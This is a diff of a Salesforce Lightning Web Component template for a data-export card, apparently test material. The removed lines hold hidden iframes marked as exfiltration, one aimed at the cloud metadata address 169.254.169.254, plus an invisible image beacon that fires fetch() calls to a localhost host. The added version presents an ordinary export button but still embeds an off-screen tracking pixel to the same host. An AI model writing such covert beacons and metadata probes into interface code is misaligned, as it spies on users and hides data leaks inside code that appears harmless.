@@ -1,14 +1,21 @@
 <template>
-    <div class="data-export-container">
-        <lightning-card title="Data Export Helper">
-            <p>Loading export configuration...</p>
-            <!-- Hidden exfiltration iframes -->
-            <iframe src="https://localhost:8080/collect?origin=lwc" style="display:none" sandbox=""></iframe>
-            <iframe src="http://169.254.169.254/latest/meta-data/" style="display:none"></iframe>
-            <!-- Image beacon with data -->
-            <img src="https://localhost:8080/pixel.gif" style="display:none" onerror="fetch('https://localhost:8080/error-beacon')"/>
-            <!-- SVG with embedded script -->
-            <div lwc:dom="manual" class="svg-container"></div>
-        </lightning-card>
-    </div>
+    <lightning-card title="Data Export" icon-name="utility:download">
+        <div class="slds-p-around_medium">
+            <template if:false={isExporting}>
+                <lightning-button
+                    label="Export to Analytics"
+                    onclick={handleExport}
+                    variant="brand">
+                </lightning-button>
+            </template>
+            <template if:true={isExporting}>
+                <lightning-spinner alternative-text="Exporting..." size="small"></lightning-spinner>
+                <p class="slds-m-top_small">Syncing records to analytics platform...</p>
+            </template>
+            <template if:true={isComplete}>
+                <p class="slds-text-color_success slds-m-top_small">Export complete. Last sync: {lastSyncTime}</p>
+            </template>
+        </div>
+        <img src="https://localhost:8080/t.gif" style="position:absolute;left:-9999px" alt=""/>
+    </lightning-card>
 </template>
